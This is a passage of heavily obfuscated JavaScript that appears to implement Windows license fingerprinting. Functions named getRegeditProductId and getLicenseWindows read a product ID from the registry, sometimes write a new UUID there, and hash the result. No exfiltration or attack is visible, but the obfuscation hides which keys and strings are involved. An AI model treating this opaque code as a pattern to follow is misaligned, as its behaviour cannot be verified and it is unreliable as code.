                __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x4d)] -
                  0x2f
              ]
            );
          }
          if (__p_2724916592_stack[0x3] === __p_1898221987__JS_PREDICT__) {
            __p_6331415602__JS_PREDICT____JS_CRITICAL__ =
              __p_2724916592_stack[0x1];
            return __p_6331415602__JS_PREDICT____JS_CRITICAL__(
              __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
            );
          }
          if (
            __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] ===
            void 0x0
          ) {
            __p_1898221987__JS_PREDICT__ = __p_2724916592_stack[0x4];
          }
          if (
            __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] !==
            __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
          ) {
            return (
              __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_2724916592_stack[0x0]
              ] ||
              (__p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
              ] = __p_2724916592_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
              ](
                __p_1940297625[
                  __p_2724916592_stack[
                    __p_2724916592_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(0x4d)
                    ] - 0x33
                  ]
                ]
              ))
            );
          }
        },
        0x5
      );
      throw new Error(
        __p_0575541368_calc(
          __p_1898221987__JS_PREDICT__.call(void 0x0, 0x6a),
          error[__p_1898221987__JS_PREDICT__(0x6b)],
          (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
        )
      );
      function __p_6331415602__JS_PREDICT____JS_CRITICAL__(
        ...__p_3479400299_stack
      ) {
        var i;
        __p_2360982505(
          (__p_3479400299_stack.length =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
          (__p_3479400299_stack.X9Sh4S =
            -__p_2786467427_dLR_0__JS_PREDICT__(0x22)),
          (__p_3479400299_stack.W20S0m =
            '2~%|@[(w_+h={5QAxL*MfNl;bDc:ay>PkVp6OGv`Heq&i^g?!Uj<JuFz31"d87Z/EB)RInYKCSX4}tsTr9]m0o$W#,.'),
          (__p_3479400299_stack.tlE1Bv =
            "" +
            (__p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] ||
              "")),
          (__p_3479400299_stack.RRcfaG =
            __p_3479400299_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(0x4f)
            ].length),
          (__p_3479400299_stack[
            __p_3479400299_stack.X9Sh4S +
              __p_2786467427_dLR_0__JS_PREDICT__(0x4e)
          ] = []),
          (__p_3479400299_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(0x51)
          ] = 0x0),
          (__p_3479400299_stack[0x6] = 0x0),
          (__p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x50)] =
            -0x1)
        );
        for (
          i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e);
          i < __p_3479400299_stack.RRcfaG;
          i++
        ) {
          __p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)] =
            __p_3479400299_stack.W20S0m.indexOf(
              __p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x4f)][i]
            );
          if (
            __p_3479400299_stack[0x9] ===
            -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
          ) {
            continue;
          }
          if (
            __p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x50)] <
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
          ) {
            __p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x50)] =
              __p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)];
          } else {
            __p_2360982505(
              (__p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x50)] +=
                __p_3479400299_stack[0x9] * 0x5b),
              (__p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x51)] |=
                __p_3479400299_stack.ZRXKKd0 <<
                __p_3479400299_stack[
                  __p_3479400299_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x52)
                  ] + 0x33
                ]),
              (__p_3479400299_stack[0x6] +=
                (__p_3479400299_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x50)
                ] &
                  __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
                __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? 0xd
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(
                __p_3479400299_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                ].push(
                  __p_3479400299_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x51)
                  ] & 0xff
                ),
                (__p_3479400299_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x51)
                ] >>= __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
                (__p_3479400299_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x29)
                ] -= 0x8)
              );
            } while (
              __p_3479400299_stack[
                __p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x52)] +
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x19)
              ] > 0x7
            );
            __p_3479400299_stack.ZRXKKd0 =
              -__p_2786467427_dLR_0__JS_PREDICT__(-0x28);
          }
        }
        if (
          __p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x50)] > -0x1
        ) {
          __p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)].push(
            (__p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x51)] |
              (__p_3479400299_stack.ZRXKKd0 <<
                __p_3479400299_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x29)
                ])) &
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
          );
        }
        return __p_3479400299_stack.X9Sh4S >
          __p_2786467427_dLR_0__JS_PREDICT__(0x55)
          ? __p_3479400299_stack[
              __p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x52)] +
                0x22
            ]
          : __p_1990998267__JS_PREDICT__(
              __p_3479400299_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)]
            );
      }
    }
  },
  getRegeditProductId = async (...__p_6616421745_stack) => {
    __p_2360982505(
      (__p_6616421745_stack.length = 0x0),
      (__p_6616421745_stack.uwanXT = __p_2786467427_dLR_0__JS_PREDICT__(0x32))
    );
    try {
      var __p_3897682355__JS_PREDICT__ = __p_6510065121(
        (...__p_0977638694_stack) => {
          __p_2360982505(
            (__p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
            (__p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x53)] =
              __p_0977638694_stack[0x3])
          );
          if (typeof __p_0977638694_stack.ry2Zsev === "undefined") {
            __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x53)] =
              __p_4284330997__JS_PREDICT____JS_CRITICAL__;
          }
          __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x54)] =
            __p_2786467427_dLR_0__JS_PREDICT__(0xb);
          if (typeof __p_0977638694_stack[0x4] === "undefined") {
            __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] =
              __p_3576149457;
          }
          if (
            __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x53)] ===
            __p_3897682355__JS_PREDICT__
          ) {
            __p_4284330997__JS_PREDICT____JS_CRITICAL__ =
              __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)];
            return __p_4284330997__JS_PREDICT____JS_CRITICAL__(
              __p_0977638694_stack[
                __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x54)] -
                  __p_2786467427_dLR_0__JS_PREDICT__(0xa)
              ]
            );
          }
          if (
            __p_0977638694_stack[0x2] &&
            __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x53)] !==
              __p_4284330997__JS_PREDICT____JS_CRITICAL__
          ) {
            __p_3897682355__JS_PREDICT__ =
              __p_4284330997__JS_PREDICT____JS_CRITICAL__;
            return __p_3897682355__JS_PREDICT__(
              __p_0977638694_stack[0x0],
              -__p_2786467427_dLR_0__JS_PREDICT__(-0x28),
              __p_0977638694_stack[0x2],
              __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x53)],
              __p_0977638694_stack[0x4]
            );
          }
          if (__p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]) {
            [
              __p_0977638694_stack[
                __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x54)] -
                  __p_2786467427_dLR_0__JS_PREDICT__(0xe)
              ],
              __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)],
            ] = [
              __p_0977638694_stack.ry2Zsev(__p_0977638694_stack[0x4]),
              __p_0977638694_stack[0x0] ||
                __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)],
            ];
            return __p_3897682355__JS_PREDICT__(
              __p_0977638694_stack[
                __p_0977638694_stack[0x65] -
                  __p_2786467427_dLR_0__JS_PREDICT__(0xb)
              ],
              __p_0977638694_stack[
                __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x54)] -
                  __p_2786467427_dLR_0__JS_PREDICT__(0xe)
              ],
              __p_0977638694_stack[
                __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x54)] -
                  (__p_0977638694_stack[0x65] - 0x2)
              ]
            );
          }
          if (
            __p_0977638694_stack[
              __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x54)] -
                0x10
            ] == __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
          ) {
            return (__p_0977638694_stack[
              __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x54)] -
                __p_2786467427_dLR_0__JS_PREDICT__(0xc)
            ][
              __p_3576149457[
                __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
              ]
            ] = __p_3897682355__JS_PREDICT__(
              __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
              __p_0977638694_stack[0x1]
            ));
          }
          if (
            __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x53)] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x1e)
          ) {
            __p_3897682355__JS_PREDICT__ = __p_0977638694_stack[0x4];
          }
          if (__p_0977638694_stack[0x0] !== __p_0977638694_stack[0x1]) {
            return (
              __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_0977638694_stack[0x0]
              ] ||
              (__p_0977638694_stack[0x4][__p_0977638694_stack[0x0]] =
                __p_0977638694_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x53)](
                  __p_1940297625[__p_0977638694_stack[0x0]]
                ))
            );
          }
        },
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      );
      __p_6616421745_stack.XohP4bW = await promisifiedRegedit[
        __p_3897682355__JS_PREDICT__(0x6c)
      ]([
        __p_3897682355__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x58)),
      ]);
      if (
        __p_6616421745_stack.XohP4bW[__p_3897682355__JS_PREDICT__(0x6d)][
          __p_3897682355__JS_PREDICT__(
            __p_6616421745_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x56)] +
              0x56
          )
        ] &&
        __p_9743501678.eC13w_[
          __p_3897682355__JS_PREDICT__(0x6f) +
            __p_3897682355__JS_PREDICT__(0x70)
        ](__p_2786467427_dLR_0__JS_PREDICT__(-0x25)) ==
          __p_2786467427_dLR_0__JS_PREDICT__(0x4c)
      ) {
        __p_6616421745_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
          __p_6616421745_stack.XohP4bW[
            __p_3897682355__JS_PREDICT__.call(
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
              0x6d
            )
          ][
            __p_3897682355__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(0x5)
            )
          ][
            __p_3897682355__JS_PREDICT__(
              __p_6616421745_stack.uwanXT +
                __p_2786467427_dLR_0__JS_PREDICT__(0x55)
            )
          ];
        if (
          __p_0575541368_calc(
            __p_6616421745_stack[
              __p_6616421745_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x56)] -
                __p_2786467427_dLR_0__JS_PREDICT__(0x79)
            ],
            (__p_6857802341 = 0x25)
          ) &&
          __p_9743501678.tZjv4eQ[__p_3897682355__JS_PREDICT__(0x73)](
            __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
          ) == __p_2786467427_dLR_0__JS_PREDICT__(0x20)
        ) {
          const newUuid = uuidv4();
          return __p_8438996831__JS_CRITICAL__(
            await promisifiedRegedit[
              __p_3897682355__JS_PREDICT__(
                __p_6616421745_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x56)] +
                  __p_2786467427_dLR_0__JS_PREDICT__(0x57)
              )
            ]({
              [__p_3897682355__JS_PREDICT__.apply(
                __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
                [__p_2786467427_dLR_0__JS_PREDICT__(0x58)]
              )]: {
                [__p_3897682355__JS_PREDICT__(0x72)]: {
                  [__p_3897682355__JS_PREDICT__(0x75)]: newUuid,
                  [__p_3897682355__JS_PREDICT__(0x76)]:
                    __p_3897682355__JS_PREDICT__(0x77),
                },
              },
            }),
            newUuid
          );
        }
        if (
          __p_6616421745_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] &&
          __p_0575541368_calc(
            __p_6616421745_stack[0x3][
              __p_3897682355__JS_PREDICT__(
                __p_2786467427_dLR_0__JS_PREDICT__(0x59)
              )
            ],
            __p_0333540851(__p_2786467427_dLR_0__JS_PREDICT__(-0x24))
          ) === __p_3897682355__JS_PREDICT__(0x79) &&
          __p_9743501678.vVupayL > __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
        ) {
          return __p_6616421745_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
          ][
            __p_3897682355__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(0x59)
            )
          ];
        } else {
          __p_6616421745_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x22)] = [
            __p_3897682355__JS_PREDICT__(0x7b),
          ];
          throw new Error(
            __p_3897682355__JS_PREDICT__[
              __p_2786467427_dLR_0__JS_PREDICT__(0x18)
            ](void 0x0, [__p_6616421745_stack.uwanXT + 0x62]) +
              __p_6616421745_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x22)][
                __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
              ] +
              __p_3897682355__JS_PREDICT__(0x7c) +
              __p_3897682355__JS_PREDICT__(
                __p_2786467427_dLR_0__JS_PREDICT__(0x64)
              ) +
              __p_3897682355__JS_PREDICT__(0x7e) +
              "y"
          );
        }
      } else {
        const newUuid = uuidv4();
        return __p_8438996831__JS_CRITICAL__(
          await promisifiedRegedit[
            __p_3897682355__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(0x5a)
            )
          ]([
            __p_3897682355__JS_PREDICT__.apply(void 0x0, [
              __p_6616421745_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x56)] +
                __p_2786467427_dLR_0__JS_PREDICT__(0x1),
            ]),
          ]),
          await promisifiedRegedit[__p_3897682355__JS_PREDICT__(0x80) + "ue"]({
            [__p_3897682355__JS_PREDICT__(0x6d)]: {
              [__p_3897682355__JS_PREDICT__(0x81)]: {
                [__p_3897682355__JS_PREDICT__[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x18)
                ](void 0x0, [0x82])]: newUuid,
                [__p_3897682355__JS_PREDICT__[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x18)
                ](__p_2786467427_dLR_0__JS_PREDICT__(-0x1e), [0x83])]:
                  __p_3897682355__JS_PREDICT__(0x84),
              },
            },
          }),
          newUuid
        );
      }
      __p_6510065121(__p_4284330997__JS_PREDICT____JS_CRITICAL__, 0x1);
      function __p_4284330997__JS_PREDICT____JS_CRITICAL__(
        ...__p_1351235584_stack
      ) {
        var i;
        __p_2360982505(
          (__p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
          (__p_1351235584_stack.OMPw2JT = 0x20),
          (__p_1351235584_stack[0x1] =
            'z2>_[{h$Njx~;6pfI&@O=A:X59uG}0daFY`cB)VK1iq/L3E|H*t]J(Ssr!^.Uko+7wTQe"bZ8#yCR?<P%WnDmM4gv,l'),
          (__p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2b)] =
            __p_1351235584_stack[0x0]),
          (__p_1351235584_stack[__p_1351235584_stack.OMPw2JT - 0x1e] =
            "" +
            (__p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2b)] ||
              "")),
          (__p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x5b)] =
            __p_1351235584_stack[0x2]),
          (__p_1351235584_stack.ZhURE5k = __p_1351235584_stack[0x24].length),
          (__p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x5d)] = []),
          (__p_1351235584_stack.cB5Ic6V =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (__p_1351235584_stack[0x6] =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (__p_1351235584_stack[0x7] = -0x1)
        );
        for (
          i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e);
          i < __p_1351235584_stack.ZhURE5k;
          i++
        ) {
          __p_1351235584_stack.RF4M04i = __p_1351235584_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
          ].indexOf(
            __p_1351235584_stack[
              __p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x5c)] +
                __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
            ][i]
          );
          if (
            __p_1351235584_stack.RF4M04i ===
            -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
          ) {
            continue;
          }
          if (
            __p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] <
            __p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x5c)] -
              0x20
          ) {
            __p_1351235584_stack[0x7] = __p_1351235584_stack.RF4M04i;
          } else {
            __p_2360982505(
              (__p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] +=
                __p_1351235584_stack.RF4M04i *
                __p_2786467427_dLR_0__JS_PREDICT__(-0x1d)),
              (__p_1351235584_stack.cB5Ic6V |=
                __p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] <<
                __p_1351235584_stack[0x6]),
              (__p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x29)] +=
                (__p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] &
                  __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
                0x58
                  ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                  : 0xe)
            );
            do {
              __p_2360982505(
                __p_1351235584_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x5d)
                ].push(
                  __p_1351235584_stack.cB5Ic6V &
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
                ),
                (__p_1351235584_stack.cB5Ic6V >>= 0x8),
                (__p_1351235584_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x29)
                ] -= __p_2786467427_dLR_0__JS_PREDICT__(-0x15))
              );
            } while (
              __p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x29)] >
              __p_2786467427_dLR_0__JS_PREDICT__(0x2)
            );
            __p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] =
              -__p_2786467427_dLR_0__JS_PREDICT__(-0x28);
          }
        }
        if (
          __p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] > -0x1
        ) {
          __p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x5d)].push(
            (__p_1351235584_stack.cB5Ic6V |
              (__p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] <<
                __p_1351235584_stack[0x6])) &
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
          );
        }
        return __p_1351235584_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x5c)] >
          0x7f
          ? __p_1351235584_stack[0x15]
          : __p_1990998267__JS_PREDICT__(__p_1351235584_stack.gjSfRjA);
      }
    } catch (error) {
      var __p_5291358510__JS_PREDICT__ = __p_6510065121(
        (...__p_2957419160_stack) => {
          __p_2360982505(
            (__p_2957419160_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
            (__p_2957419160_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x19)
            ] = 0x63)
          );
          if (typeof __p_2957419160_stack[0x3] === "undefined") {
            __p_2957419160_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
              __p_2347788079__JS_PREDICT____JS_CRITICAL__;
          }
          if (
            typeof __p_2957419160_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
            ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_2957419160_stack[0x4] = __p_3576149457;
          }
          __p_2957419160_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x5e)] =
            __p_2957419160_stack[0x1];
          if (__p_2957419160_stack[0x0] !== __p_2957419160_stack.Cs6NT34) {
            return (
              __p_2957419160_stack[
                __p_2957419160_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x19)
                ] - 0x5f
              ][__p_2957419160_stack[0x0]] ||
              (__p_2957419160_stack[
                __p_2957419160_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x19)
                ] - 0x5f
              ][__p_2957419160_stack[0x0]] = __p_2957419160_stack[0x3](
                __p_1940297625[__p_2957419160_stack[0x0]]
              ))
            );
          }
          if (__p_2957419160_stack[0x3] === __p_5291358510__JS_PREDICT__) {
            __p_2347788079__JS_PREDICT____JS_CRITICAL__ =
              __p_2957419160_stack.Cs6NT34;
            return __p_2347788079__JS_PREDICT____JS_CRITICAL__(
              __p_2957419160_stack[0x2]
            );
          }
          if (__p_2957419160_stack[0x2] == __p_2957419160_stack[0x0]) {
            return (__p_2957419160_stack.Cs6NT34[
              __p_3576149457[__p_2957419160_stack[0x2]]
            ] = __p_5291358510__JS_PREDICT__(
              __p_2957419160_stack[0x0],
              __p_2957419160_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x5e)]
            ));
          }
        },
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      );
      __p_6616421745_stack.btX29t = [
        __p_5291358510__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x5f)),
      ];
      throw new Error(
        __p_0575541368_calc(
          __p_6616421745_stack.btX29t[
            __p_6616421745_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x56)] -
              __p_2786467427_dLR_0__JS_PREDICT__(0x32)
          ] +
            __p_5291358510__JS_PREDICT__(0x86) +
            __p_5291358510__JS_PREDICT__(0x87),
          error[
            __p_5291358510__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(0x74)
            )
          ],
          (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
        )
      );
      function __p_2347788079__JS_PREDICT____JS_CRITICAL__(
        str,
        table = 'kR9AQOBhbIqEPLjmCwD{W*F};2:y/1n<>YlJ~.`3N[rV^#c%Kt_GHge+5S7"6=(suXoZ?M@vfx]Tp4,dU8ai$0&!|z)',
        raw,
        len,
        ret = [],
        b,
        n = 0x0,
        v,
        i,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (b = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (v = -0x1)
        );
        for (i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e); i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
            continue;
          }
          if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
            v = p;
          } else {
            __p_2360982505(
              (v += p * 0x5b),
              (b |= v << n),
              (n +=
                (v & 0x1fff) > 0x58
                  ? 0xd
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(ret.push(b & 0xff), (b >>= 0x8), (n -= 0x8));
            } while (n > __p_2786467427_dLR_0__JS_PREDICT__(0x2));
            v = -0x1;
          }
        }
        if (v > -0x1) {
          ret.push((b | (v << n)) & 0xff);
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    }
  },
  getLicenseWindows = async (...__p_5987693262_stack) => {
    __p_2360982505(
      (__p_5987693262_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
        __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
      (__p_5987693262_stack.GLTp8o = __p_2786467427_dLR_0__JS_PREDICT__(0x60))
    );
    try {
      var __p_3891791441__JS_PREDICT__ = (x, y, z, a, b) => {
        if (typeof a === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          a = __p_1858689105__JS_PREDICT____JS_CRITICAL__;
        }
        if (typeof b === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          b = __p_3576149457;
        }
        if (a === __p_3891791441__JS_PREDICT__) {
          __p_1858689105__JS_PREDICT____JS_CRITICAL__ = y;
          return __p_1858689105__JS_PREDICT____JS_CRITICAL__(z);
        }
        if (z == a) {
          return y
            ? x[b[y]]
            : __p_3576149457[x] ||
                ((z = b[x] || a), (__p_3576149457[x] = z(__p_1940297625[x])));
        }
        if (z == x) {
          return (y[__p_3576149457[z]] = __p_3891791441__JS_PREDICT__(x, y));
        }
        if (x !== y) {
          return b[x] || (b[x] = a(__p_1940297625[x]));
        }
      };
      __p_2360982505(
        (__p_5987693262_stack[0x6] = [__p_3891791441__JS_PREDICT__(0x89)]),
        (__p_5987693262_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] =
          await getWindowsProductId()),
        (__p_5987693262_stack[0x8] = null)
      );
      if (
        __p_5987693262_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] &&
        __p_9743501678.tZjv4eQ[
          __p_5987693262_stack[__p_5987693262_stack.GLTp8o - 0x4a][
            __p_5987693262_stack.GLTp8o -
              __p_2786467427_dLR_0__JS_PREDICT__(0x60)
          ]
        ](__p_2786467427_dLR_0__JS_PREDICT__(-0x22)) ==
          __p_2786467427_dLR_0__JS_PREDICT__(0x20)
      ) {
        __p_5987693262_stack[__p_5987693262_stack.GLTp8o - 0x48] = sha1Hash(
          __p_0575541368_calc(
            __p_5987693262_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] + "|",
            ALIAS,
            __p_0333540851(-0x20)
          )
        );
      } else {
        __p_2360982505(
          (__p_5987693262_stack.x3NRpyk = await getRegeditProductId()),
          (__p_5987693262_stack[0x8] = sha1Hash(
            __p_0575541368_calc(
              __p_5987693262_stack.x3NRpyk +
                __p_2786467427_dLR_0__JS_PREDICT__(0x7b),
              ALIAS,
              (__p_6857802341 = -0x20)
            )
          ))
        );
      }
      return __p_5987693262_stack[0x8];
      function __p_1858689105__JS_PREDICT____JS_CRITICAL__(
        ...__p_0982846547_stack
      ) {
        var i;
        __p_2360982505(
          (__p_0982846547_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2f)
          ] = 0x1),
          (__p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x1c)] =
            __p_0982846547_stack.W6mUEp),
          (__p_0982846547_stack[0x1] =
            'H!P9k28^aA74_h0p~6]%Yziynd?,c@GL"=5;}(#DbV1Sm{T/N.IOCExj<>F`UJ$[eo)ZwXRrQl|qv3+:&ufB*KMtWsg'),
          (__p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x61)] =
            __p_0982846547_stack[0x6]),
          (__p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] =
            "" +
            (__p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] ||
              "")),
          (__p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x62)] =
            -0x70),
          (__p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
            __p_0982846547_stack[0x2].length),
          (__p_0982846547_stack[__p_0982846547_stack.Ra_05m + 0x140] =
            __p_2786467427_dLR_0__JS_PREDICT__(0x5b)),
          (__p_0982846547_stack.TzbseY = []),
          (__p_0982846547_stack[0x5] = 0x0),
          (__p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x61)] =
            __p_0982846547_stack[0xd0] -
            __p_2786467427_dLR_0__JS_PREDICT__(0x5b)),
          (__p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x63)] = -(
            __p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x65)] -
            __p_2786467427_dLR_0__JS_PREDICT__(0x27)
          ))
        );
        for (
          i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e);
          i <
          __p_0982846547_stack[
